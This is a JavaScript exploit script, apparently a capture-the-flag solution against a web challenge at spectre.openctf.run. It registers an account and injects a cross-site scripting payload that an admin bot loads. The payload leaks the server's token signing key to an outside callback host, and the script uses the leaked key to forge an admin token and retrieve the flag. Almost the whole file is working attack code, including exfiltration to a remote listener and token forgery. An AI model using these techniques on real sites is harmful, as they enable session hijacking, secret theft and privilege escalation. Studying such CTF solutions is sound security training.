#!/usr/bin/env -S bun run
import * as crypto from 'crypto';

// - Configurations

// The target URL of the problem, without trailing slash
const TARGET_ORIGIN = "https://spectre.openctf.run"
// The port to listen on at localhost
const LISTEN_PORT = 54100;
// The callback uri, it'll finally pass to port `LISTEN_PORT` at localhost
const CALLBACK_URI = "https://sxss.cnily.top/";
// How much turn to leak in one bot-committing session
const TOT_TURN = 4;

// - Sign key
function sign(json, secret) {
    const XOR_KETBUF = Buffer.from([0x11, 0x45, 0x14]);
    function xorBuffer(databuf, keybuf) {
        let res = Buffer.alloc(databuf.length);
        for (let i = 0; i < databuf.length; i++) {
            res[i] = databuf[i] ^ keybuf[i % keybuf.length];
        }
        return res;
    }
    function tobase64(buf) {
        return Buffer.from(buf).toString('base64').replace(/=/g, '');
    }
    let data_buf = Buffer.from(JSON.stringify(json));
    let xor_buf = Buffer.from(XOR_KETBUF);
    let salt_buf = crypto.randomBytes(16);

    let hash = crypto.createHmac('sha256', secret);
    let encdata = Buffer.concat([xorBuffer(Buffer.from(data_buf), xor_buf), salt_buf]);
    hash.update(encdata);
    let sig_buf = hash.digest();
    let token = tobase64(data_buf) + '.' + tobase64(Buffer.concat([xorBuffer(salt_buf, xor_buf), sig_buf]));
    return token;
}

// - Token key leak stat
const historyMap = new Map();
let countdown_timeout = null;
let token_key = ''
let leak_done = false;
function statFinal() {
    const history = Array.from(historyMap.values());
    let final = '';
    for (let i = 0; i < 16; i++) {
        //which has the most
        let cnt_map = {};
        history.forEach(h => {
            if (h.length <= i) return;
            if (!/[a-zA-Z0-9]/.test(h[i])) cnt_map['_'] = 0;
            else if (Object.prototype.hasOwnProperty.call(cnt_map, h[i])) cnt_map[h[i]]++;
            else cnt_map[h[i]] = 1;
        })
        let maxc = history[0][i], maxv = 0;
        for (let key in cnt_map) {
            if (cnt_map[key] > maxv) {
                maxv = cnt_map[key];
                maxc = key;
            }
        }
        final += maxc;
    }
    return final;
}

// - Payload preparation
const code = await Bun.build({ entrypoints: [import.meta.dir + "/code.js"], minify: true })
    .then(res => res.outputs[0].text())
    .then(text => text
        .replace(/(Blob\(\[\`)\s*([^`]+)\s*(\`)/,
            (_, p1, t, p2) => p1 + t.replace(/([^;\[\(\{])(\r?\n)/g, '$1;$2').replace(/\s+/g, ' ') + p2)
        .replace(/\(\d+,\s*["'][^"']+["']\)([^()]*)$/, `(${TOT_TURN},${JSON.stringify(CALLBACK_URI)})$1`))
const payload = `<script type="text/javascript" nonce="{{ nonce }}">document.addEventListener("DOMContentLoaded", ()=>{${code}})</script>`
const account = {
    uid: "exp_" + Array.from({ length: 6 }, () => Math.random().toString(36)[2]).join(""),
    password_sha256: Array.from({ length: 64 }, () => Math.random().toString(16)[2]).join(""),
}

// - Leak
const exit = (code) => process.exit(code)
const mark_prev_green = () => console.info('\x1b[1A\x1b[0G\x1b[32m[+]\x1b[0m');
const mark_prev_red = () => console.info('\x1b[1A\x1b[0G\x1b[31m[-]\x1b[0m');
const print_blue = (msg) => console.info('\x1b[34m[ ]\x1b[0m ' + msg);
const print_prev_green = (msg) => console.info('\x1b[1A\x1b[0G\x1b[2K\x1b[32m[+]\x1b[0m ' + msg);
const print_prev_red = (msg) => console.info('\x1b[1A\x1b[0G\x1b[2K\x1b[31m[-]\x1b[0m ' + msg);
const print_value = (title, value) => console.info(`\x1b[35m[+] ${title}:\x1b[0m \x1b[36m${value}\x1b[0m`);

let resp

// Register
print_blue(`Registering account: \x1b[36m${account.uid}\x1b[0m`);
resp = await fetch(TARGET_ORIGIN + "/account/signup", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: new URLSearchParams({ username: account.uid, password: account.password_sha256 }),
})
if (resp.status !== 200) mark_prev_red(), exit(1)
print_prev_green(`Account registered: \x1b[36m${account.uid}\x1b[0m`);

// Login
print_blue(`Logging in`);
resp = await fetch(TARGET_ORIGIN + "/account/login", {
    method: "POST",
    headers: { "Content-Type": "application/x-www-form-urlencoded" },
    body: new URLSearchParams({ username: account.uid, password: account.password_sha256, remember: 0 }),
})
if (resp.status !== 200) mark_prev_red(), exit(1)
print_prev_green(`Logged in as \x1b[36m${account.uid}\x1b[0m`);
const token = resp.headers.get("Set-Cookie").match(/token=([^;]+)/)[1];
print_value("Token", token);

// Submit
print_blue(`Submitting payload`);
resp = await fetch(TARGET_ORIGIN + "/submit", {
    method: "POST",
    headers: { "Cookie": `token=${token}`, 'Content-Type': 'application/x-www-form-urlencoded' },
    body: new URLSearchParams({ content: payload }),
})
if (resp.status !== 200) mark_prev_red(), exit(1)
print_prev_green(`Payload submitted`);
const uuid = (await resp.json()).uuid;
print_value("UUID", uuid);

// Start listening server
print_blue("Creating listening server")
const listen_server = Bun.serve({
    port: LISTEN_PORT,
    fetch: (req) => {
        const url = new URL(req.url);
        const method = req.method.toUpperCase();
        const path = url.pathname + url.search;
        const search = url.searchParams

        let prev_totline = Math.max(0, ...Array.from(historyMap.keys()).map(k => parseInt(k) + 1));
        const colored_path = '\x1b[90m' +
            path.replace(/=([^&]+)/g, '=\x1b[38;5;244m$1\x1b[90m')
                .replace(/(&|\?)([^&=]+)(&|$)/g, '$1\x1b[38;5;244m$2\x1b[90m$3') + '\x1b[0m'

        // console.info(`\x1b[34m${method}\x1b[0m ${path}`);
        if (countdown_timeout === null) {
            countdown_timeout = setTimeout(() => { token_key = statFinal(); leak_done = true; }, 30 * 1000);
        }
        let turn = search.get('t'), prefix = search.get('q'), is_end = search.get('end');
        if (turn && prefix && (historyMap.get(turn) || '').length < prefix.length) {
            historyMap.set(turn, prefix);
            let back_cnt = prev_totline - parseInt(turn) + (leak_done ? 1 : 0)
            const ANSI_BACK = '\x1b[1A\x1b[0G'.repeat(back_cnt);
            const ANSI_RESTORE = '\n'.repeat(back_cnt > 0 ? back_cnt - 1 : 0);
            console.info(ANSI_BACK + `    \x1b[34m${method}\x1b[0m ${colored_path}` + ANSI_RESTORE);
        }
        if (is_end !== null && prefix) {
            console.info(`    \x1b[34m${method}\x1b[0m ${colored_path}`);
            clearTimeout(countdown_timeout); token_key = statFinal(); leak_done = true;
        }

        return new Response(null, {
            status: 200,
            headers: {
                "Access-Control-Allow-Origin": "*",
                "Access-Control-Allow-Methods": "*",
                "Access-Control-Allow-Headers": "*",
            }
        })
    }
})
print_prev_green(`Listening server started at ${listen_server.url}`);

// Commit to bot
print_blue(`Committing to bot`);
fetch(TARGET_ORIGIN + "/bot", {
    method: "GET",
    headers: {
        "Cookie": `token=${token}`,
        'Accept': 'text/event-stream',
        "X-Bot-Visit": btoa("http://localhost:3000/s/" + uuid),
    }
})
print_prev_green(`Committed to bot, waiting...`);

// Waiting
await new Promise((resolve) => {
    const interval = setInterval(() => {
        if (leak_done) { clearInterval(interval); resolve(); listen_server.stop(); }
    }, 1000)
})
print_value("Token Key", token_key);

// Sign new token
const new_token = sign({ uid: account.uid, role: "admin" }, token_key);
print_value("New Token", new_token);

// Get flag
print_blue(`Getting flag`);
resp = await fetch(TARGET_ORIGIN + "/flag", {
    headers: { "Cookie": `token=${new_token}` },
})
if (resp.status !== 200) {
    print_prev_red(`Failed to get flag: \x1b[33m${resp.status} ${resp.statusText}\x1b[0m`);
    exit(1);
} else {
    let responseText = await resp.text();
    const flag = (responseText.match(/>[^<]+</) || [''])[0].slice(1, -1) || responseText;
    mark_prev_green();
    print_value("Flag", flag);
}